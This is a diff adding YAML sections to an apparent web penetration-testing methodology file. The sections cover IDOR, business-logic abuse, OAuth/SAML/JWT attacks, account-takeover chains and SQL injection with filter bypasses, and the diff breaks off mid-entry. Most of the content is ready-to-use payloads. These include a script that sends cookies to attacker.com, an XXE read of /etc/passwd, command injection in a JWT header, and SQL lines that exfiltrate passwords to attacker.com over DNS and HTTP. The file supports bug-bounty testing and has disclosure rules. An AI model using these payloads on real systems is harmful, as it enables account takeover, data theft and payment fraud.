@@ -1245,11 +1245,130 @@ A01_broken_access_control:
       
     insecure_direct_object_reference:
       description: "Direct access to objects via user-supplied input"
-      test_cases: 
-        - "UUID/GUID enumeration"
-        - "Hash collision/prediction"
-        - "Timestamp-based ID guessing"
-        - "Encoded ID manipulation"
+      
+      idor_detection_techniques:
+        sequential_id_testing:
+          - "Identify numeric IDs in requests"
+          - "Test incremental/decremental values"
+          - "Enumerate all accessible resources"
+          payloads:
+            - "GET /api/user/1234 → /api/user/1235"
+            - "GET /api/invoice/100 → /api/invoice/101"
+            - "DELETE /api/document/999 → /api/document/1000"
+        
+        uuid_guid_testing:
+          techniques:
+            - "Collect multiple UUIDs and analyze"
+            - "Test version 1 UUIDs (time-based)"
+            - "Attempt GUID prediction via patterns"
+          tools:
+            - "Burp Intruder for enumeration"
+            - "Custom scripts for UUID analysis"
+          
+        hash_based_id_testing:
+          methods:
+            - "Identify hash algorithm (MD5, SHA1, etc.)"
+            - "Test for hash of predictable values"
+            - "Check for hash collisions"
+          payloads:
+            - "/api/user/5d41402abc4b2a76b9719d911017c592 (MD5 of 'hello')"
+            - "/api/user/aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d (SHA1 of 'hello')"
+            
+        encoded_id_manipulation:
+          techniques:
+            - "Base64 decode IDs"
+            - "URL decode IDs"
+            - "Hex decode IDs"
+            - "Identify encryption patterns"
+          payloads:
+            - "id=MTIzNDU= (base64 of '12345')"
+            - "id=dXNlcjEyMzQ= (base64 of 'user1234')"
+            
+        compound_key_testing:
+          description: "Multi-part identifiers"
+          payloads:
+            - "/api/order/user123/order456 → /api/order/user124/order456"
+            - "/api/file/project1/document5 → /api/file/project2/document5"
+            
+      idor_in_different_methods:
+        get_requests:
+          - "GET /api/user/123/profile"
+          - "GET /api/invoice/456/download"
+          
+        post_requests:
+          - "POST /api/document/view {"doc_id": 789}"
+          - "POST /api/transfer {"from_account": 111, "to_account": 222}"
+          
+        put_patch_requests:
+          - "PUT /api/user/123/update"
+          - "PATCH /api/settings/456"
+          
+        delete_requests:
+          - "DELETE /api/post/789"
+          - "DELETE /api/account/321"
+          
+      idor_with_body_parameters:
+        json_payloads:
+          - '{"user_id": 123, "action": "delete"}'
+          - '{"account_id": 456, "operation": "transfer"}'
+          - '{"invoice_id": 789, "action": "view"}'
+          
+        array_parameters:
+          - '{"user_ids": [123, 456, 789]}'
+          - '{"document_ids": [1, 2, 3, 999, 1000]}'
+          
+      blind_idor_detection:
+        techniques:
+          - "Monitor for status code changes"
+          - "Compare response sizes"
+          - "Check for timing differences"
+          - "Look for error message variations"
+        indicators:
+          success: "200 OK with data"
+          unauthorized: "403 Forbidden"
+          not_found: "404 Not Found"
+          
+      idor_attack_chains:
+        chain_1_account_takeover:
+          step_1: "Find IDOR in profile endpoint"
+          step_2: "Enumerate other user IDs"
+          step_3: "Modify email via IDOR"
+          step_4: "Request password reset to attacker email"
+          impact: "Complete account takeover"
+          
+        chain_2_data_exfiltration:
+          step_1: "Identify IDOR in document API"
+          step_2: "Script to enumerate all document IDs"
+          step_3: "Download all accessible documents"
+          impact: "Mass data breach"
+          
+        chain_3_privilege_escalation:
+          step_1: "Find IDOR in user role endpoint"
+          step_2: "Modify own role parameter"
+          step_3: "Escalate to admin privileges"
+          impact: "Vertical privilege escalation"
+          
+      idor_with_filters:
+        techniques:
+          - "Test filters with different user contexts"
+          - "Bypass filters with encoding"
+          - "Use wildcards or operators"
+        payloads:
+          - "/api/users?filter=admin → /api/users?filter=*"
+          - "/api/invoices?user_id=123 → /api/invoices?user_id=*"
+          - "/api/files?owner=alice → /api/files?owner=bob"
+          
+      mass_assignment_idor:
+        description: "Combine IDOR with mass assignment"
+        payloads:
+          - 'PUT /api/user/123 {"role": "admin", "is_verified": true}'
+          - 'PATCH /api/account/456 {"balance": 999999, "account_type": "premium"}'
+          
+      graphql_idor:
+        query_manipulation:
+          - 'query { user(id: 123) { email ssn creditCard } }'
+          - 'query { users { id email ssn } }'
+          - 'mutation { updateUser(id: 456, role: "admin") }'
   
   cwe_mappings:
     - "CWE-22: Path Traversal"
@@ -3179,6 +3298,1278 @@ API10_unsafe_consumption:
     - "Monitor third-party API interactions"
     - "Maintain inventory of integrations"
     - "Have incident response plan for third-party compromise"
+```
+
+---
+
+## 🎯 BUG BOUNTY PROGRAM SUPPORT FRAMEWORK
+
+### Comprehensive Bug Bounty Testing Methodology
+
+```yaml
+bug_bounty_framework:
+  
+  program_scope_definition:
+    description: "Define and respect bug bounty program boundaries"
+    
+    in_scope_targets:
+      web_applications:
+        primary_domains:
+          - "*.example.com"
+          - "app.example.com"
+          - "api.example.com"
+          - "admin.example.com"
+        mobile_apps:
+          - "iOS app (version X.X+)"
+          - "Android app (version X.X+)"
+        api_endpoints:
+          - "https://api.example.com/v1/*"
+          - "https://api.example.com/v2/*"
+          - "GraphQL endpoint: /graphql"
+        
+      vulnerability_types_in_scope:
+        critical:
+          - "Remote Code Execution (RCE)"
+          - "SQL Injection (SQLi)"
+          - "Authentication Bypass"
+          - "Privilege Escalation (Vertical/Horizontal)"
+          - "Server-Side Request Forgery (SSRF)"
+          - "Insecure Direct Object Reference (IDOR)"
+          - "Account Takeover (ATO)"
+          - "Payment/Transaction Manipulation"
+        high:
+          - "Stored Cross-Site Scripting (XSS)"
+          - "XML External Entity (XXE)"
+          - "Insecure Deserialization"
+          - "Business Logic Flaws"
+          - "Mass Assignment"
+          - "JWT/Token Manipulation"
+          - "OAuth/SSO Vulnerabilities"
+          - "Session Management Issues"
+        medium:
+          - "Reflected XSS"
+          - "CSRF with significant impact"
+          - "Sensitive Data Exposure"
+          - "Security Misconfiguration"
+          - "Rate Limiting Bypass"
+          - "Information Disclosure"
+        low:
+          - "Self XSS"
+          - "Open Redirect (limited impact)"
+          - "Cookie Security Issues"
+          - "Missing Security Headers"
+          - "Clickjacking"
+          
+    out_of_scope_targets:
+      excluded_domains:
+        - "*.test.example.com"
+        - "*.staging-old.example.com"
+        - "legacy.example.com"
+        - "internal.example.com"
+      excluded_ips:
+        - "10.0.0.0/8 (Internal networks)"
+        - "172.16.0.0/12 (Internal networks)"
+        - "192.168.0.0/16 (Internal networks)"
+      third_party_services:
+        - "Social media integrations"
+        - "Payment processor domains"
+        - "Analytics services"
+        - "CDN provider domains"
+        
+      vulnerability_types_out_of_scope:
+        - "Denial of Service (DoS/DDoS)"
+        - "Physical security issues"
+        - "Social engineering attacks"
+        - "Spam or phishing"
+        - "Issues in third-party applications"
+        - "Self XSS without demonstrable impact"
+        - "Logout CSRF"
+        - "Weak SSL/TLS ciphers without demonstrable impact"
+        - "Known issues (already reported)"
+        - "Issues requiring user interaction with no security impact"
+        - "Best practice violations without direct security impact"
+        - "Theoretical vulnerabilities without PoC"
+        - "Software version disclosure"
+        - "Descriptive error messages"
+        - "Username/email enumeration"
+        - "Host header injection without impact"
+        - "HTTP methods (TRACE, OPTIONS)"
+        
+  bug_bounty_specific_testing:
+    prioritization_strategy:
+      p1_critical_impact:
+        focus_areas:
+          - "Authentication and authorization"
+          - "Payment and transaction flows"
+          - "User data access and modification"
+          - "Admin panel and privileged functions"
+          - "API endpoints with sensitive operations"
+        expected_payout: "$5,000 - $20,000+"
+        
+      p2_high_impact:
+        focus_areas:
+          - "Account takeover vectors"
+          - "Business logic flaws"
+          - "IDOR in sensitive resources"
+          - "Stored XSS in high-traffic areas"
+          - "OAuth/SSO vulnerabilities"
+        expected_payout: "$1,000 - $5,000"
+        
+      p3_medium_impact:
+        focus_areas:
+          - "Information disclosure"
+          - "CSRF on state-changing operations"
+          - "Reflected XSS"
+          - "Rate limiting bypass"
+        expected_payout: "$250 - $1,000"
+        
+    testing_methodology:
+      reconnaissance_phase:
+        passive_information_gathering:
+          - "Certificate Transparency logs analysis"
+          - "Subdomain enumeration (Amass, Subfinder)"
+          - "Github dorking for exposed credentials"
+          - "Historical data (Wayback Machine)"
+          - "Technology stack fingerprinting"
+          - "ASN enumeration for IP ranges"
+          - "DNS records analysis"
+          - "Social media intelligence"
+          
+        active_reconnaissance:
+          - "Port scanning (authorized targets only)"
+          - "Service version detection"
+          - "Web server fingerprinting"
+          - "API endpoint discovery"
+          - "JavaScript file analysis"
+          - "Mobile app reverse engineering"
+          - "Directory/file brute forcing"
+          
+      vulnerability_hunting:
+        quick_wins:
+          - "IDOR testing on all ID parameters"
+          - "JWT token analysis and manipulation"
+          - "Mass assignment testing"
+          - "GraphQL introspection and query manipulation"
+          - "OAuth flow manipulation"
+          - "File upload testing"
+          - "SSRF on URL parameters"
+          - "SQLi on all input fields"
+          
+        advanced_hunting:
+          - "Business logic flaw identification"
+          - "Race condition exploitation"
+          - "Second-order injection"
+          - "Type juggling vulnerabilities"
+          - "Deserialization attacks"
+          - "XXE in XML parsers"
+          - "SSTI in template engines"
+          - "Cache poisoning"
+          - "HTTP request smuggling"
+          
+  responsible_disclosure:
+    reporting_guidelines:
+      report_structure:
+        - "Clear, concise title"
+        - "Vulnerability type and severity"
+        - "Affected endpoints/components"
+        - "Step-by-step reproduction steps"
+        - "Proof of concept (PoC)"
+        - "Impact assessment"
+        - "Remediation recommendations"
+        - "Supporting evidence (screenshots, videos)"
+        
+      do_not_do:
+        - "Do not access more data than necessary"
+        - "Do not modify or delete data"
+        - "Do not pivot to other systems"
+        - "Do not perform DoS attacks"
+        - "Do not exfiltrate sensitive data"
+        - "Do not publicly disclose without permission"
+        - "Do not test production systems aggressively"
+        - "Do not automate testing at high rates"
+```
+
+---
+
+## 💼 BUSINESS LOGIC ERROR & ABUSE FRAMEWORK
+
+### Comprehensive Business Logic Testing
+
+```yaml
+business_logic_framework:
+  
+  definition:
+    description: |
+      Business logic vulnerabilities are flaws in the application's workflow
+      and business rules that allow attackers to perform unauthorized actions,
+      manipulate transactions, or abuse intended functionality.
+      
+  vulnerability_categories:
+    
+    price_manipulation:
+      description: "Manipulating prices, discounts, or payment amounts"
+      
+      test_scenarios:
+        negative_quantity:
+          test: "Purchase items with negative quantity"
+          payload: '{"item_id": 123, "quantity": -5}'
+          expected_impact: "Receive money instead of paying"
+          
+        price_tampering:
+          test: "Modify price in POST request"
+          payload: '{"item_id": 123, "price": 0.01, "quantity": 1}'
+          expected_impact: "Purchase items for arbitrary price"
+          
+        discount_stacking:
+          test: "Apply multiple discount codes"
+          payloads:
+            - '{"coupon": "SAVE10,SAVE20,SAVE30"}'
+            - 'Apply codes in multiple requests'
+          expected_impact: "Exceed intended discount limits"
+          
+        currency_manipulation:
+          test: "Change currency after price calculation"
+          payload: |
+            1. Add item in USD ($100)
+            2. Switch to IDR before payment
+            3. Pay 100 IDR (~$0.006)
+          expected_impact: "Pay in weak currency"
+          
+        rounding_errors:
+          test: "Exploit decimal rounding in calculations"
+          payload: |
+            Transfer $0.001 × 1000 times
+            = $1.00 but may round down each time
+          expected_impact: "Accumulate small amounts"
+          
+    rate_limit_bypass:
+      description: "Circumventing rate limits and throttling"
+      
+      techniques:
+        header_manipulation:
+          headers:
+            - "X-Forwarded-For: 1.1.1.1"
+            - "X-Real-IP: 2.2.2.2"
+            - "X-Originating-IP: 3.3.3.3"
+            - "X-Client-IP: 4.4.4.4"
+            - "True-Client-IP: 5.5.5.5"
+          test: "Rotate headers to appear as different IPs"
+          
+        endpoint_variations:
+          payloads:
+            - "GET /api/login"
+            - "POST /api/login"
+            - "GET /api/v1/login"
+            - "GET /api/v2/login"
+            - "GET /api/login/"
+            - "GET /api/login.json"
+          test: "Use different endpoints for same functionality"
+          
+        case_manipulation:
+          payloads:
+            - "/api/LOGIN"
+            - "/api/Login"
+            - "/api/login"
+          test: "Bypass case-sensitive rate limiting"
+          
+        unicode_normalization:
+          payloads:
+            - "/api/login"
+            - "/api/logi%E2%80%8Bn"
+            - "/api/log%69n"
+          test: "Use unicode tricks to bypass filters"
+          
+        session_cycling:
+          test: "Create new session for each request"
+          method: "Delete cookies between requests"
+          
+    workflow_bypass:
+      description: "Skipping required steps in business processes"
+      
+      scenarios:
+        payment_bypass:
+          attack_flow:
+            step_1: "Add items to cart"
+            step_2: "Proceed to checkout"
+            step_3: "Skip payment page"
+            step_4: "Go directly to order confirmation"
+            step_5: "Check if order processed without payment"
+          payloads:
+            - "POST /api/order/confirm without /api/payment"
+            - "Manipulate order status to 'paid'"
+            - "Replay old payment confirmation token"
+            
+        verification_skip:
+          scenarios:
+            email_verification:
+              - "Access protected resource before email verification"
+              - "Manipulate email_verified parameter"
+              - "Use expired verification token with modified timestamp"
+            two_factor_bypass:
+              - "Skip 2FA page in multi-step login"
+              - "Reuse old 2FA token"
+              - "Brute force 2FA code with rate limit bypass"
+            age_verification:
+              - "Manipulate birthdate parameter"
+              - "Skip age gate entirely"
+              
+        registration_abuse:
+          test: "Exploit registration flow"
+          scenarios:
+            referral_fraud:
+              - "Self-referral by creating multiple accounts"
+              - "Automate account creation for bonuses"
+              - "Manipulate referral chain"
+            trial_abuse:
+              - "Create multiple accounts for trial periods"
+              - "Reset trial by deleting cookies"
+              - "Use temporary email for unlimited trials"
+              
+    parameter_manipulation:
+      description: "Tampering with hidden or calculated parameters"
+      
+      test_cases:
+        role_parameter:
+          payloads:
+            - '{"username": "attacker", "role": "admin"}'
+            - '{"username": "attacker", "is_admin": true}'
+            - '{"username": "attacker", "privilege": "admin"}'
+          test: "Add admin role during registration/update"
+          
+        points_balance:
+          payloads:
+            - '{"points": 999999}'
+            - '{"points": -100}  # Subtract negative = add'
+            - '{"points": "999999"}'
+          test: "Manipulate reward points or balance"
+          
+        hidden_fields:
+          test: "Modify hidden form fields"
+          payloads:
+            - '<input type="hidden" name="price" value="0.01">'
+            - '<input type="hidden" name="admin" value="1">'
+            - '<input type="hidden" name="discount" value="100">'
+            
+        array_manipulation:
+          payloads:
+            - '{"item_ids": [1,2,3,3,3]}  # Duplicate items'
+            - '{"quantities": [1,2,-5]}  # Negative quantity'
+            - '{"prices": null}  # Null values'
+          test: "Manipulate arrays in requests"
+          
+    race_conditions:
+      description: "Exploiting timing windows in concurrent operations"
+      
+      scenarios:
+        double_spending:
+          description: "Spend same balance multiple times"
+          attack:
+            - "Send multiple simultaneous withdrawal requests"
+            - "Exploit TOCTOU (Time-of-check-time-of-use)"
+            - "Use same coupon code multiple times concurrently"
+          tool: "Turbo Intruder (Burp Suite)"
+          
+        limited_resource:
+          description: "Reserve/purchase limited items multiple times"
+          attack:
+            - "Send concurrent requests for last item in stock"
+            - "Book same appointment slot multiple times"
+            - "Claim limited offer multiple times"
+            
+        like_bombing:
+          description: "Bypass one-vote-per-user restriction"
+          attack:
+            - "Send multiple like/vote requests simultaneously"
+            - "Exploit race condition in vote counting"
+            
+    logic_flow_manipulation:
+      description: "Disrupting intended application workflow"
+      
+      scenarios:
+        state_manipulation:
+          test: "Manipulate order/account state"
+          payloads:
+            - '{"order_status": "delivered"}'
+            - '{"account_status": "verified"}'
+            - '{"subscription": "premium"}'
+            
+        callback_manipulation:
+          test: "Manipulate callback URLs"
+          payloads:
+            - '{"callback_url": "https://attacker.com"}'
+            - '{"redirect_url": "https://evil.com"}'
+            - '{"webhook_url": "https://attacker.com/steal"}'
+            
+        time_manipulation:
+          test: "Manipulate timestamps"
+          payloads:
+            - '{"created_at": "2025-01-01T00:00:00Z"}'
+            - '{"expires_at": "2099-12-31T23:59:59Z"}'
+            - '{"timestamp": -1}'  # Negative timestamp
+            
+  advanced_business_logic_tests:
+    
+    e_commerce_specific:
+      cart_manipulation:
+        - "Add items after payment initiated"
+        - "Modify cart during payment processing"
+        - "Merge carts with different currencies"
+        - "Use expired cart with old prices"
+        
+      inventory_manipulation:
+        - "Purchase more than available stock"
+        - "Reserve items without purchasing"
+        - "Create negative inventory"
+        
+      shipping_manipulation:
+        - "Modify shipping address after payment"
+        - "Use free shipping on paid items"
+        - "Manipulate shipping cost calculation"
+        
+    financial_services:
+      transaction_manipulation:
+        - "Modify transaction amount mid-process"
+        - "Cancel transaction after confirmation"
+        - "Transfer negative amounts"
+        - "Exploit rounding in currency conversion"
+        
+      fund_transfer_abuse:
+        - "Transfer to self with fee rebate"
+        - "Circular transfers for money laundering"
+        - "Exploit cashback mechanisms"
+        
+    social_platform:
+      engagement_manipulation:
+        - "Automate likes/follows"
+        - "Fake engagement metrics"
+        - "Self-voting abuse"
+        - "Bot network simulation"
+        
+    subscription_services:
+      subscription_abuse:
+        - "Downgrade after billing, upgrade before reset"
+        - "Cancel and immediate resubscribe for discount"
+        - "Exploit free trial loopholes"
+        - "Upgrade tier without payment"
+        
+  detection_methodology:
+    manual_testing:
+      - "Understand complete business workflow"
+      - "Map all state transitions"
+      - "Identify trust boundaries"
+      - "Test edge cases and error conditions"
+      - "Try unexpected input combinations"
+      - "Test concurrent operations"
+      - "Analyze client-side validation"
+      - "Test with tampered cookies/tokens"
+      
+    automated_testing:
+      - "Fuzz business logic parameters"
+      - "Race condition testing with Turbo Intruder"
+      - "State machine fuzzing"
+      - "Workflow permutation testing"
+```
+
+---
+
+## 🔐 AUTHENTICATION LOGIC FLOW & ACCOUNT TAKEOVER
+
+### OAuth, SSO, SAML, and JWT Exploitation Framework
+
+```yaml
+authentication_exploitation_framework:
+  
+  oauth_vulnerabilities:
+    description: "OAuth 2.0 and OpenID Connect exploitation"
+    
+    authorization_code_flow:
+      redirect_uri_manipulation:
+        vulnerabilities:
+          open_redirect:
+            payload: "?redirect_uri=https://evil.com"
+            impact: "Authorization code interception"
+            
+          subdomain_takeover:
+            payload: "?redirect_uri=https://sub.victim.com"
+            requirement: "Subdomain takeover on victim domain"
+            impact: "Code interception via controlled subdomain"
+            
+          path_traversal:
+            payloads:
+              - "?redirect_uri=https://victim.com/../evil.com"
+              - "?redirect_uri=https://victim.com/callback/../../evil"
+            impact: "Bypass redirect_uri validation"
+            
+          url_encoding_bypass:
+            payloads:
+              - "?redirect_uri=https%3A%2F%2Fevil.com"
+              - "?redirect_uri=https://victim.com%2F@evil.com"
+              - "?redirect_uri=https://victim.com%2F%2Fevil.com"
+            impact: "Bypass URL validation via encoding"
+            
+      state_parameter_issues:
+        missing_state:
+          test: "Remove state parameter entirely"
+          impact: "CSRF in OAuth flow"
+          
+        predictable_state:
+          test: "Analyze state generation pattern"
+          attack: "Predict victim's state value"
+          
+        state_reuse:
+          test: "Use same state multiple times"
+          impact: "Replay attacks"
+          
+      implicit_flow_vulnerabilities:
+        token_leakage:
+          vectors:
+            - "Access token in URL (browser history)"
+            - "Access token in Referer header"
+            - "Access token in logs"
+            - "Access token via open redirect"
+            
+        token_substitution:
+          test: "Use attacker token in victim flow"
+          payload: "Replace access_token parameter"
+          
+    oauth_misc_attacks:
+      pre_account_takeover:
+        description: "Link OAuth account before email verified"
+        attack_flow:
+          step_1: "Attacker registers with victim@email.com"
+          step_2: "Before email verification, link OAuth account"
+          step_3: "Victim registers and verifies email"
+          step_4: "Attacker logs in via OAuth"
+          impact: "Account takeover of victim account"
+          
+      oauth_account_linking_bypass:
+        test: "Link OAuth account to any email"
+        payload: '{"email": "victim@example.com", "oauth_id": "attacker_id"}'
+        
+      scope_upgrade:
+        test: "Request minimal scope, use maximal scope"
+        attack:
+          step_1: "User approves 'read' scope"
+          step_2: "Attacker uses token with 'write' scope"
+          step_3: "Check if scope validation exists"
+          
+  sso_vulnerabilities:
+    saml_attacks:
+      description: "SAML 2.0 security testing"
+      
+      xml_signature_wrapping:
+        description: "XSW attack on SAML assertion"
+        attack:
+          - "Copy valid signed assertion"
+          - "Create malicious assertion with attacker data"
+          - "Wrap malicious assertion around valid signature"
+          - "Server validates signature but processes malicious data"
+        payloads:
+          xsw1: "Insert malicious assertion before signed assertion"
+          xsw2: "Insert malicious assertion after signed assertion"
+          xsw3: "Insert malicious assertion as sibling"
+          
+      saml_response_replay:
+        test: "Reuse old SAML response"
+        mitigation_check: "Timestamp and MessageID validation"
+        
+      saml_response_modification:
+        tests:
+          attribute_modification:
+            - "Change user email in assertion"
+            - "Change user role/permissions"
+            - "Change NameID to impersonate"
+            
+          assertion_recipients:
+            test: "Use SAML response for different application"
+            
+      xxe_in_saml:
+        payload: |
+          <?xml version="1.0"?>
+          <!DOCTYPE foo [
+            <!ENTITY xxe SYSTEM "file:///etc/passwd">
+          ]>
+          <samlp:Response>
+            <saml:Assertion>
+              <saml:AttributeValue>&xxe;</saml:AttributeValue>
+            </saml:Assertion>
+          </samlp:Response>
+          
+    jwt_exploitation:
+      description: "JSON Web Token attacks"
+      
+      algorithm_confusion:
+        none_algorithm:
+          payload: |
+            {
+              "alg": "none",
+              "typ": "JWT"
+            }.{
+              "sub": "admin",
+              "role": "admin"
+            }.
+          test: "Remove signature, set alg to 'none'"
+          
+        hs256_to_rs256:
+          description: "Confuse symmetric with asymmetric"
+          attack:
+            step_1: "Obtain public key (from /jwks or certificate)"
+            step_2: "Create JWT with HS256 using public key as secret"
+            step_3: "Server validates with RS256 but accepts HS256"
+          
+      weak_secret:
+        test: "Brute force JWT secret"
+        tools:
+          - "jwt_tool"
+          - "hashcat -m 16500"
+        wordlists:
+          - "rockyou.txt"
+          - "jwt-secrets.txt"
+          
+      key_confusion:
+        jwk_injection:
+          payload: |
+            {
+              "alg": "RS256",
+              "typ": "JWT",
+              "jwk": {
+                "kty": "RSA",
+                "n": "attacker_generated_key",
+                "e": "AQAB"
+              }
+            }
+          test: "Inject own public key in JWT header"
+          
+        jku_header_injection:
+          payload: |
+            {
+              "alg": "RS256",
+              "jku": "https://attacker.com/jwks.json"
+            }
+          test: "Point to attacker-controlled JWKS URL"
+          
+        kid_manipulation:
+          payloads:
+            path_traversal:
+              - '"kid": "../../dev/null"'
+              - '"kid": "/dev/null"'
+            sql_injection:
+              - '"kid": "key\' OR \'1\'=\'1"'
+            command_injection:
+              - '"kid": "key\"; whoami #"'
+              
+      claims_manipulation:
+        tests:
+          privilege_escalation:
+            - '{"role": "user"} → {"role": "admin"}'
+            - '{"is_admin": false} → {"is_admin": true}'
+            - '{"permissions": []} → {"permissions": ["*"]}'
+            
+          expiration_bypass:
+            - 'Remove "exp" claim'
+            - '{"exp": 9999999999}'
+            - '{"exp": -1}'
+            
+          user_impersonation:
+            - '{"sub": "attacker"} → {"sub": "victim"}'
+            - '{"user_id": "123"} → {"user_id": "456"}'
+            
+  account_takeover_techniques:
+    description: "Complete account takeover attack chains"
+    
+    password_reset_vulnerabilities:
+      token_leakage:
+        vectors:
+          - "Token in GET parameter (logged)"
+          - "Token in Referer header"
+          - "Token emailed in plain text"
+          - "Short/predictable token"
+          
+      token_reuse:
+        test: "Use token multiple times"
+        expected: "Token should be single-use"
+        
+      token_bruteforce:
+        test: "Brute force reset token"
+        conditions:
+          - "Short token length"
+          - "No rate limiting"
+          - "Predictable token generation"
+          
+      user_enumeration:
+        payloads:
+          - "Reset for existing email: 'Token sent'"
+          - "Reset for non-existing: 'Email not found'"
+        impact: "Identify valid users"
+        
+      reset_link_tampering:
+        tests:
+          - "Change email parameter in reset link"
+          - "Change user_id in reset request"
+          - "Use victim's token with attacker's session"
+          
+    session_vulnerabilities:
+      session_fixation:
+        attack_flow:
+          step_1: "Attacker obtains session ID"
+          step_2: "Force victim to use attacker's session ID"
+          step_3: "Victim logs in"
+          step_4: "Attacker uses same session ID (now authenticated)"
+          
+      session_hijacking:
+        vectors:
+          xss_cookie_theft:
+            payload: '<script>new Image().src="http://attacker.com/steal?c="+document.cookie;</script>'
+            
+          session_token_in_url:
+            test: "Check if session ID in URL parameters"
+            impact: "Session leakage via Referer"
+            
+          predictable_session:
+            test: "Analyze session generation algorithm"
+            attack: "Predict active session IDs"
+            
+    credential_stuffing:
+      description: "Use leaked credentials from breaches"
+      methodology:
+        - "Obtain credential lists from breaches"
+        - "Test credentials against target"
+        - "Identify successful authentications"
+        - "Bypass rate limiting if present"
+      mitigation_check:
+        - "Rate limiting on login"
+        - "CAPTCHA after failed attempts"
+        - "Account lockout policy"
+        - "Leaked password detection"
+        
+    multi_factor_bypass:
+      mfa_bypass_techniques:
+        missing_mfa_on_critical:
+          test: "Check if MFA enforced on all flows"
+          vectors:
+            - "Password change without MFA"
+            - "Email change without MFA"
+            - "OAuth linking without MFA"
+            - "API access without MFA"
+            
+        backup_codes_abuse:
+          test: "Generate unlimited backup codes"
+          attack: "Brute force backup codes"
+          
+        remember_device_abuse:
+          test: "'Remember this device' token theft"
+          attack: "Steal and reuse remember-me token"
+          
+        totp_time_window:
+          test: "Extended time window acceptance"
+          attack: "Use TOTP codes beyond normal 30s window"
+          
+        sms_otp_issues:
+          vectors:
+            - "SMS interception (SS7)"
+            - "SIM swapping attack"
+            - "Reuse of old OTP codes"
+            - "Brute force OTP (4-6 digits)"
+            
+    account_enumeration:
+      registration_enumeration:
+        tests:
+          - "Register with existing email: 'Email already in use'"
+          - "Register with new email: 'Account created'"
+          
+      login_enumeration:
+        tests:
+          - "Login with valid user, wrong pass: 'Incorrect password'"
+          - "Login with invalid user: 'User not found'"
+          
+      timing_attacks:
+        test: "Measure response time differences"
+        analysis:
+          - "Valid user: slower (password hash check)"
+          - "Invalid user: faster (immediate rejection)"
+          
+    subdomain_takeover_for_ato:
+      scenario:
+        - "Find unclaimed subdomain (auth.victim.com)"
+        - "Claim subdomain on cloud provider"
+        - "Set up malicious OAuth/SSO endpoint"
+        - "Intercept authentication flows"
+        
+  authentication_attack_chains:
+    complete_ato_chain_1:
+      name: "OAuth Pre-Account Takeover"
+      steps:
+        step_1:
+          action: "Attacker registers with victim@company.com"
+          requirement: "No email verification required immediately"
+          
+        step_2:
+          action: "Link Google OAuth to unverified account"
+          vulnerability: "OAuth linking before verification"
+          
+        step_3:
+          action: "Real victim registers with same email"
+          result: "Email verification sent to victim"
+          
+        step_4:
+          action: "Victim verifies email"
+          result: "Account activated but OAuth already linked"
+          
+        step_5:
+          action: "Attacker logs in via Google OAuth"
+          result: "Complete account takeover"
+          
+      impact: "Full account control without victim's password"
+      cvss: 9.8
+      
+    complete_ato_chain_2:
+      name: "JWT + IDOR Account Takeover"
+      steps:
+        step_1:
+          action: "Register normal account"
+          obtain: "JWT token"
+          
+        step_2:
+          action: "Analyze JWT structure"
+          find: '"user_id": 1234'
+          
+        step_3:
+          action: "Enumerate user IDs via IDOR"
+          endpoint: "GET /api/user/1235"
+          result: "Find victim user ID"
+          
+        step_4:
+          action: "Modify JWT user_id claim"
+          payload: '{"user_id": 1235}'
+          requirement: "Weak JWT secret or alg none"
+          
+        step_5:
+          action: "Use modified JWT"
+          result: "Access victim's account"
+          
+      impact: "Account takeover via JWT manipulation + IDOR"
+      cvss: 9.1
+```
+
+---
+
+## 🔬 ADVANCED INJECTION & PAYLOAD GENERATION
+
+### Comprehensive Injection Techniques with WAF Bypass
+
+```yaml
+advanced_injection_framework:
+  
+  sql_injection_advanced:
+    description: "Advanced SQLi techniques with modern bypasses"
+    
+    bypass_techniques:
+      waf_bypass_methods:
+        case_manipulation:
+          payloads:
+            - "SeLeCt * FrOm users"
+            - "/*!50000sElEcT*/ * /*!50000fRoM*/ users"
+            
+        comment_injection:
+          payloads:
+            mysql:
+              - "SELECT/**//**/FROM users"
+              - "SELECT/*!50000*/FROM users"
+              - "SELECT#comment%0AFROM users"
+            mssql:
+              - "SELECT/**/FROM users"
+              - "SELECT--comment%0AFROM users"
+            oracle:
+              - "SELECT/**/FROM users"
+              - "SELECT--comment%0AFROM users"
+              
+        encoding_bypass:
+          payloads:
+            url_encoding:
+              - "%53%45%4C%45%43%54 (SELECT)"
+              - "%55%4E%49%4F%4E (UNION)"
+            double_url_encoding:
+              - "%2553%2545%254C%2545%2543%2554"
+            unicode:
+              - "\\u0053\\u0045\\u004C\\u0045\\u0043\\u0054"
+            hex_encoding:
+              - "0x53454C454354"
+              
+        whitespace_bypass:
+          payloads:
+            - "SELECT/**/FROM/**/users"
+            - "SELECT%09FROM%09users (TAB)"
+            - "SELECT%0BFROM%0Busers (Vertical TAB)"
+            - "SELECT%0CFROM%0Cusers (Form Feed)"
+            - "SELECT%A0FROM%A0users (Non-breaking space)"
+            
+        keyword_replacement:
+          payloads:
+            union_alternatives:
+              - "/*!50000UNION*/"
+              - "union%23%0Aselect"
+              - "UNI/**/ON"
+            select_alternatives:
+              - "/*!50000SELECT*/"
+              - "SEL/**/ECT"
+              - "%53ELECT"
+              
+    advanced_exploitation:
+      boolean_based_blind:
+        payloads:
+          generic:
+            - "' AND 1=1--"
+            - "' AND 1=2--"
+          substring_extraction:
+            - "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--"
+            - "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--"
+            
+      time_based_blind:
+        payloads:
+          mysql:
+            - "' AND SLEEP(5)--"
+            - "' AND IF(1=1,SLEEP(5),0)--"
+            - "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+          postgresql:
+            - "'; SELECT pg_sleep(5)--"
+            - "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
+          mssql:
+            - "'; WAITFOR DELAY '00:00:05'--"
+            - "' AND IF(1=1,WAITFOR DELAY '00:00:05',0)--"
+          oracle:
+            - "' AND DBMS_LOCK.SLEEP(5)--"
+            - "' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM DUAL)--"
+            
+      out_of_band:
+        dns_exfiltration:
+          mysql:
+            - "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\share')))--"
+          mssql:
+            - "'; EXEC master..xp_dirtree '\\\\'+@@version+'.attacker.com\\share'--"
+          oracle:
+            - "' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1))=1--"
+          postgresql:
